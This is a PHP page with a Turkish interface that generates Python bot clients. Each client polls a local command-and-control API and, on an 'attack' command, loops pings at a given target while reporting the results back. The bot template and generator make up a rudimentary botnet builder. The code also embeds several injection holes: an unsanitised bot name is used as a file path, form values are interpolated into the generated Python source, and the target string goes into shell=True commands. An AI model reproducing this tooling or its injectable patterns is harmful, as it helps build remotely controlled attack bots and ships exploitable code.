<?php
// Hata ayıklama modu
define('DEBUG_MODE', true);
if (DEBUG_MODE) {
    error_reporting(E_ALL);
    ini_set('display_errors', 1);
}

// Bot dosyalarının kaydedileceği dizin
define('BOT_DIRECTORY', 'bots/');

if (!file_exists(BOT_DIRECTORY)) {
    mkdir(BOT_DIRECTORY, 0777, true);
}

$error_message = "";
$success_message = "";

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $bot_name = isset($_POST['bot_name']) ? trim($_POST['bot_name']) : '';
    $api_token = isset($_POST['api_token']) ? trim($_POST['api_token']) : '';
    $cheat_id = isset($_POST['cheat_id']) ? trim($_POST['cheat_id']) : '';

    if (empty($bot_name) || empty($api_token) || empty($cheat_id)) {
        $error_message = "⚠️ Lütfen bot adı, API token'ı ve Cheat ID girin!";
    } else {
        $file_name = BOT_DIRECTORY . $bot_name . ".py";

        // Python bot kodu (API ile uyumlu)
        $file_content = <<<EOD
import requests
import time
import subprocess
import json

API_URL = "http://127.0.0.1/api.php"
BOT_NAME = "$bot_name"
API_TOKEN = "$api_token"
CHEAT_ID = "$cheat_id"

running_attack = False  # Saldırı durumu kontrolü

def get_command():
    try:
        response = requests.post(API_URL, json={"action": "get_commands", "bot_name": BOT_NAME, "api_token": API_TOKEN})
        if response.status_code == 200:
            return response.json().get("command"), response.json().get("target")
    except Exception as e:
        print(f"API Hatası: {e}")
    return None, None

def send_output(output):
    requests.post(API_URL, json={"action": "send_output", "bot_name": BOT_NAME, "output": output})

def start_attack(target):
    global running_attack
    running_attack = True
    while running_attack:
        try:
            output = subprocess.check_output(f"ping -c 1 {target}", shell=True, stderr=subprocess.STDOUT, text=True)
            send_output(output)
        except subprocess.CalledProcessError as e:
            send_output(f"Hata: {e.output}")
        time.sleep(2)  # 2 saniyede bir saldırı yap

def stop_attack():
    global running_attack
    running_attack = False
    send_output("🔴 Saldırı durduruldu!")

while True:
    command, target = get_command()

    if command:
        if command == "attack" and target:
            send_output(f"🚀 Saldırı başlatılıyor: {target}")
            start_attack(target)
        elif command == "stop":
            stop_attack()
        elif command == "ping" and target:
            try:
                output = subprocess.check_output(f"ping -c 4 {target}", shell=True, stderr=subprocess.STDOUT, text=True)
                send_output(output)
            except subprocess.CalledProcessError as e:
                send_output(f"Hata: {e.output}")

    time.sleep(5)  # 5 saniyede bir API'yi kontrol et
EOD;

        if (file_put_contents($file_name, $file_content)) {
            $success_message = "✅ Bot dosyası başarıyla oluşturuldu: $file_name";
        } else {
            $error_message = "❌ Dosya oluşturulamadı.";
        }
    }
}
?>

<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Python Bot Oluşturucu</title>
    <style>
        body {
            background-color: #121212;
            color: #ffffff;
            font-family: Arial, sans-serif;
            text-align: center;
        }
        .container {
            margin: 50px auto;
            width: 300px;
            padding: 20px;
            background: #1e1e1e;
            border-radius: 10px;
            box-shadow: 0px 0px 10px rgba(255, 255, 255, 0.2);
        }
        input, button {
            width: 100%;
            margin: 10px 0;
            padding: 10px;
            border: none;
            border-radius: 5px;
        }
        input {
            background: #333;
            color: #fff;
        }
        button {
            background: #6200ea;
            color: white;
            cursor: pointer;
        }
        button:hover {
            background: #3700b3;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>🐍 Python Bot Oluşturucu</h2>

        <?php if (!empty($error_message)): ?>
            <p style="color: red;"> <?php echo $error_message; ?> </p>
        <?php endif; ?>

        <?php if (!empty($success_message)): ?>
            <p style="color: green;"> <?php echo $success_message; ?> </p>
        <?php endif; ?>

        <form method="post">
            <label for="bot_name">🤖 Bot Adı:</label>
            <input type="text" name="bot_name" id="bot_name" required>
            
            <label for="api_token">🔑 API Token:</label>
            <input type="text" name="api_token" id="api_token" required>
            
            <label for="cheat_id">🎮 Cheat ID:</label>
            <input type="text" name="cheat_id" id="cheat_id" required>
            
            <button type="submit">🚀 Botu Oluştur</button>
        </form>
    </div>
</body>
</html>
